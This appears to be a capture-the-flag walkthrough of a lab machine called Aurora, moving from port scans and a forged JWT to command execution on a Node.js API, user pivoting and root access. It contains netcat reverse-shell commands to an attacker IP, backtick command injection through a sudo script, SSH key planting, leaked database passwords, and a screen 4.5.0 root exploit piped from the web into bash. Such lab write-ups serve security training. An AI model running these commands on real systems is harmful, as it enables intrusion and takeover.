# Aurora

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.154:22
Open 10.0.2.154:3000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.154
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 db:f9:46:e5:20:81:6c:ee:c7:25:08:ab:22:51:36:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQGwzNlaaGEELNmSaaA5KPNGnxOCBP8oa7QB1kl8hkIrIGanBlB8e+lifNATIlUM57ReHEaoIiJMZLQlMTATjzQ3g76UxpkRMSfFMfjOwBr3T9xAuggn11GkgapKzgQXop1xpVnpddudlA2DGT56xhfAefOoh9LV/Sx5gw/9sH+YpjYZNn4WYrfHuIcvObaa1jE7js8ySeIRQffj5n6wX/eq7WbohB6yFcLb1PBvnfNhvqgyvwcCWiwZoNhRMa+0ANpdpZyOyKQcbR51w36rmgJI0Y9zLIyjHvtxiNuncns0KFvlnS3JXywv277OvJuqhH4ORvXM9kgSKebGV+/5R0D/kFmUA0Q4o1EEkpwzXiiUTLs6j4ZwNojp3iUVWT6Wb7BmnxjeQzG05LXkoavc63aNf+lcSh9mQsepQNo5aHlHzMefPx/j2zbjQN8CHCxOPWLTcpFlyQSZjjnpGxwYiYyqUZ0sF8l9GWtj6eVgeScGvGy6e0YTPG9/d6o2oWdMM=
|   256 33:c0:95:64:29:47:23:dd:86:4e:e6:b8:07:33:67:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFwHzjIh47PVCBqaldJCFibsrsU4ERboGRj1+5RNyV5zFxNTNpdu8f/rNL9s0p7zkqERtD2xb4zBIl6Vj9Fpdxw=
|   256 be:aa:6d:42:43:dd:7d:d4:0e:0d:74:78:c1:89:a1:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOUM7hNt+CcfC4AKOuJumfdt3GCMSintNt9k0S2tA1XS
3000/tcp open  http    syn-ack Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Error
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

```bash
└─$ curl 10.0.2.154:3000 -i
HTTP/1.1 404 Not Found
X-Powered-By: Express
Content-Security-Policy: default-src 'none'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 139
Date: Tue, 23 Dec 2025 15:21:39 GMT
Connection: keep-alive
Keep-Alive: timeout=5

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /</pre>
</body>
</html>
```

### API

First I scanned with `GET`, but nothing came back. Since this looks like an API I scanned with both methods.
```bash
└─$ feroxbuster -u http://10.0.2.154:3000 --thorough -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -m GET,POST
404      GET       10l       15w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404     POST       10l       15w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
401     POST        1l        2w       22c http://10.0.2.154:3000/Login
401     POST        1l        2w       22c http://10.0.2.154:3000/login
```

```bash
└─$ feroxbuster -u http://10.0.2.154:3000 --thorough -n -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -m GET,POST
400     POST        1l        6w       29c http://10.0.2.154:3000/register
401     POST        1l        2w       22c http://10.0.2.154:3000/login
401     POST        1l        1w       12c http://10.0.2.154:3000/execute
```

```bash
└─$ curl 10.0.2.154:3000/register -X POST 'role=admin'
The "role" field is not validcurl: (3) URL rejected: Bad hostname

└─$ curl 10.0.2.154:3000/register -X POST --json '{"role":"admin"}'
Not authorized ! 
```

### Login

`admin` is a valid value, `guest` is not, `user` is valid too.
```bash
└─$ curl 10.0.2.154:3000/register -X POST --json '{"role":"user"}'
Column 'username' cannot be null                                                                                                                                                             
└─$ curl 10.0.2.154:3000/register -X POST --json '{"role":"user","username":"test"}'
Column 'password' cannot be null                                                                                                                                                             
└─$ curl 10.0.2.154:3000/register -X POST --json '{"role":"user","username":"test","password":"test"}'
Registration OK 
```

Login
```bash
└─$ curl 10.0.2.154:3000/login -X POST --json '{"role":"user","username":"test","password":"test"}'
{"accessToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc2NjUwNDI1OH0.sviq017cegZYaq0_KtVl1QLq9N-ZQMLg1ut3B6rz0cs"} 
```

Accidently caused error, API path leaked
```bash
└─$ curl 10.0.2.154:3000/execute -X POST --json '{"accessToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc2NjUwNDI1OH0.sviq017cegZYaq0_KtVl1QLq9N-ZQMLg1ut3B6rz0cs"'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>SyntaxError: Unexpected end of JSON input<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at parse (/opt/login-app/node_modules/body-parser/lib/types/json.js:92:19)<br> &nbsp; &nbsp;at /opt/login-app/node_modules/body-parser/lib/read.js:128:18<br> &nbsp; &nbsp;at AsyncResource.runInAsyncScope (async_hooks.js:190:9)<br> &nbsp; &nbsp;at invokeCallback (/opt/login-app/node_modules/raw-body/index.js:238:16)<br> &nbsp; &nbsp;at done (/opt/login-app/node_modules/raw-body/index.js:227:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/opt/login-app/node_modules/raw-body/index.js:287:7)<br> &nbsp; &nbsp;at IncomingMessage.emit (events.js:314:20)<br> &nbsp; &nbsp;at endReadableNT (_stream_readable.js:1241:12)<br> &nbsp; &nbsp;at processTicksAndRejections (internal/process/task_queues.js:84:21)</pre>
</body>
</html>
```

ha?
```bash
└─$ curl 10.0.2.154:3000/execute -X POST --json '{"accessToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc2NjUwNDI1OH0.sviq017cegZYaq0_KtVl1QLq9N-ZQMLg1ut3B6rz0cs"}'
Unauthorized

└─$ curl 10.0.2.154:3000/execute -X POST -b 'accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc2NjUwNDI1OH0.sviq017cegZYaq0_KtVl1QLq9N-ZQMLg1ut3B6rz0cs'
Unauthorized

└─$ curl 10.0.2.154:3000/execute -X POST -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc2NjUwNDI1OH0.sviq017cegZYaq0_KtVl1QLq9N-ZQMLg1ut3B6rz0cs'
Not authorized 
```

### RCE

We may need to be admin, both role and username
```bash
└─$ jwt_tool 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc2NjUwNDI1OH0.sviq017cegZYaq0_KtVl1QLq9N-ZQMLg1ut3B6rz0cs' -S hs256 -p nopassword -I -pc role -pv admin -pc username -pv admin
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzY2NTA0MjU4fQ.CVPz7O46e1QpmnQQTNPZKpJMyURGEsbvVAoSAIV72GU

└─$ curl 10.0.2.154:3000/execute -X POST -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzY2NTA0MjU4fQ.CVPz7O46e1QpmnQQTNPZKpJMyURGEsbvVAoSAIV72GU" -s | html2markdown

    TypeError [ERR_INVALID_ARG_TYPE]: The "file" argument must be of type string. Received undefined
        at validateString (internal/validators.js:120:11)
        at normalizeSpawnArguments (child_process.js:411:3)
        at spawn (child_process.js:547:16)
        at Object.execFile (child_process.js:237:17)
        at exec (child_process.js:158:25)
        at /opt/login-app/app.js:69:3
        at Layer.handle [as handle_request] (/opt/login-app/node_modules/express/lib/router/layer.js:95:5)
        at next (/opt/login-app/node_modules/express/lib/router/route.js:144:13)
        at /opt/login-app/app.js:112:5
        at /opt/login-app/node_modules/jsonwebtoken/verify.js:261:12
```

:sigh:
```bash
└─$ curl 10.0.2.154:3000/execute -X POST -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzY2NTA0MjU4fQ.CVPz7O46e1QpmnQQTNPZKpJMyURGEsbvVAoSAIV72GU" --json '{"file":"id"}' -s | html2markdown
    TypeError [ERR_INVALID_ARG_TYPE]: The "file" argument must be of type string. Received undefined
```

```bash
└─$ ffuf -u 'http://10.0.2.154:3000/execute' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H 'Content-Type: application/json' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzY2NTA0MjU4fQ.CVPz7O46e1QpmnQQTNPZKpJMyURGEsbvVAoSAIV72GU' -d '{"FUZZ":"id"}' -mc all -fs 913
command                 [Status: 200, Size: 54, Words: 3, Lines: 2, Duration: 401ms]
```

```bash
└─$ curl 10.0.2.154:3000/execute -X POST -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzY2NTA0MjU4fQ.CVPz7O46e1QpmnQQTNPZKpJMyURGEsbvVAoSAIV72GU" --json '{"command":"id"}'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement

```bash
└─$ curl 10.0.2.154:3000/execute -X POST -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzY2NTA0MjU4fQ.CVPz7O46e1QpmnQQTNPZKpJMyURGEsbvVAoSAIV72GU" --json '{"command":"busybox nc 10.0.2.149 4444 -e /bin/bash"}'
---
└─$ penelope -p 4444
www-data@aurora:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
www-data@aurora:~$ cat app.js
...
const accessTokenSecret = 'nopassword';
const pool = mysql.createPool({
  host: 'localhost',
  user: 'admin',
  password: 'zMgRthZraw6Sf',
  database: 'auroraDB',
});
...
```

```bash
www-data@aurora:~$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
doro:x:1000:1000:,,,:/home/doro:/bin/bash
```

```bash
www-data@aurora:~$ mysql -u'admin' -p'zMgRthZraw6Sf' auroraDB -e 'SELECT * FROM users;'
+----+----------+--------------+-------+
| id | username | password     | role  |
+----+----------+--------------+-------+
|  1 | admin    | CMcvw9Q5v79Z | admin |
| 29 | test     | test         | user  |
+----+----------+--------------+-------+
```

```bash
www-data@aurora:~$ sudo -l
Matching Defaults entries for www-data on aurora:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on aurora:
    (doro) NOPASSWD: /usr/bin/python3 /home/doro/tools.py *
```

```python
www-data@aurora:~$ cat /home/doro/tools.py
import os
import sys

def main():
    if len(sys.argv) < 2:
        print_help()
        return

    option = sys.argv[1]
    if option == "--ping":
        ping()
    elif option == "--traceroute":
        traceroute_ip()
    else:
        print("Invalid option.")
        print_help()

def print_help():
    print("Usage: python3 network_tool.py <option>")
    print("Options:")
    print("--ping           Ping an IP address")
    print("--traceroute     Perform a traceroute on an IP address")

def ping():
    ip_address = input("Enter an IP address: ")

    forbidden_chars = ["&", ";", "(", ")", "||", "|", ">", "<", "*", "?"]
    for char in forbidden_chars:
        if char in ip_address:
            print("Forbidden character found: {}".format(char))
            sys.exit(1)

    os.system('ping -c 2 ' + ip_address)

def traceroute_ip():
    ip_address = input("Enter an IP address: ")

    if not is_valid_ip(ip_address):
        print("Invalid IP address.")
        return

    traceroute_command = "traceroute {}".format(ip_address)
    os.system(traceroute_command)

def is_valid_ip(ip_address):
    octets = ip_address.split(".")
    if len(octets) != 4:
        return False
    for octet in octets:
        if not octet.isdigit() or int(octet) < 0 or int(octet) > 255:
            return False
    return True

if __name__ == "__main__":
    main()
```

After some thought we are able to bypass the backticks \o/
```bash
www-data@aurora:~$ echo '`id`' | sudo -u doro python3 /home/doro/tools.py --ping
Enter an IP address: ping: groups=1000(doro): Name or service not known
```

```bash
└─$ gen_ssh_deploy
[+] Running: ssh-keygen -f id_rsa -P x -q
[+] Remote command to run:
echo "mkdir -p ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBlUEQk8Iw3Xph1RIDVKQrcuzl7q+RgyH6yQfHQAjJt4 woyag@kraken' >> ~/.ssh/authorized_keys; chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys"
```

```bash
www-data@aurora:~$ echo '`busybox nc 10.0.2.149 4444 -e /bin/bash`' | sudo -u doro python3 /home/doro/tools.py --ping
```

```bash
# In Penelope
# Press F12 -> Detach session
(Penelope)─(Session [1])> sessions

➤  aurora.hmv~10.0.2.154-Linux-x86_64

    ID  | Shell | User         | Source
    [1] | PTY   | www-data(33) | TCPListener(0.0.0.0:4444)
    <2> | Raw   | doro(1000)   | TCPListener(0.0.0.0:4444)

(Penelope)─(Session [1])> sessions 2
doro@aurora:/opt/login-app$ id
uid=1000(doro) gid=1000(doro) groups=1000(doro)
```

## SSH

```bash
└─$ gen_ssh_deploy
[+] Running: ssh-keygen -f id_rsa -P x -q
[+] Remote command to run:
echo "mkdir -p ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBlUEQk8Iw3Xph1RIDVKQrcuzl7q+RgyH6yQfHQAjJt4 woyag@kraken' >> ~/.ssh/authorized_keys; chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys"
# Run as `doro`
```

```bash
└─$ ssh -i id_rsa doro@10.0.2.154
doro@aurora:~$ id
uid=1000(doro) gid=1000(doro) groups=1000(doro)
```

### User.txt

```bash
doro@aurora:~$ cat user.txt
ccd839df5504a7ace407b5aeca436e81
```

## Privilege Escalation

```bash
doro@aurora:~$ find / -perm -4000 -ls 2>/dev/null
   412370     52 -rwsr-xr--   1 root     messagebus    51336 Oct  5  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   420932    472 -rwsr-xr-x   1 root     root         481608 Jul  2  2022 /usr/lib/openssh/ssh-keysign
   395793     56 -rwsr-xr-x   1 root     root          55528 Jan 20  2022 /usr/bin/mount
   391773     64 -rwsr-xr-x   1 root     root          63960 Feb  7  2020 /usr/bin/passwd
   391769     60 -rwsr-xr-x   1 root     root          58416 Feb  7  2020 /usr/bin/chfn
   395426     72 -rwsr-xr-x   1 root     root          71912 Jan 20  2022 /usr/bin/su
   391770     52 -rwsr-xr-x   1 root     root          52880 Feb  7  2020 /usr/bin/chsh
   395267     44 -rwsr-xr-x   1 root     root          44632 Feb  7  2020 /usr/bin/newgrp
   391772     88 -rwsr-xr-x   1 root     root          88304 Feb  7  2020 /usr/bin/gpasswd
   439943   1744 -rwsr-sr-x   1 root     root        1785104 Mar  3  2023 /usr/bin/screen # <-
   439794    180 -rwsr-xr-x   1 root     root         182600 Jan 14  2023 /usr/bin/sudo
   395795     36 -rwsr-xr-x   1 root     root          35040 Jan 20  2022 /usr/bin/umount
```

- [https://gtfobins.github.io/gtfobins/screen/](https://gtfobins.github.io/gtfobins/screen/)

```bash
doro@aurora:~$ screen --version
Screen version 4.05.00 (GNU) 10-Dec-16
```

- [screen-v4.5.0-priv-escalate](https://github.com/YasserREED/screen-v4.5.0-priv-escalate)

```bash
doro@aurora:/tmp$ wget https://raw.githubusercontent.com/YasserREED/screen-v4.5.0-priv-escalate/refs/heads/main/exploit.sh -qO- | bash
doro@aurora:/tmp$ cd /etc || exit 1
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
screen -ls
/tmp/rootshell
 from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-doro.

# id
uid=0(root) gid=0(root) groups=0(root),1000(doro)
```

### Root.txt

```bash
# cat /root/root.txt
052cf26a6e7e33790391c0d869e2e40c
```